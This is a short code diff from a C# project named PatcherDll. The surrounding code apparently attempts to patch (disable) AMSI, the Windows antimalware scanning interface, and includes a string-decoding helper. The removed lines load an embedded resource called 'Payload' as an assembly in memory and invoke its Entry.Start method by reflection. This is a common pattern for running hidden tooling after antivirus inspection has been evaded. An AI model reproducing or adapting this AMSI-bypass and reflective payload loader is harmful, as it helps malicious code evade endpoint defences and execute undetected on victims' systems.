@@ -34,14 +34,6 @@ namespace PatcherDll
                 Console.WriteLine("Cannot Patch AMSI");
 #endif
             }
-
-
-            var asm = Properties.Resources.Payload;
-
-            var assembly = System.Reflection.Assembly.Load(asm);
-            var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
-            method.Invoke(null, new object[] { });
-
         }
 
         static string dec(string enc)
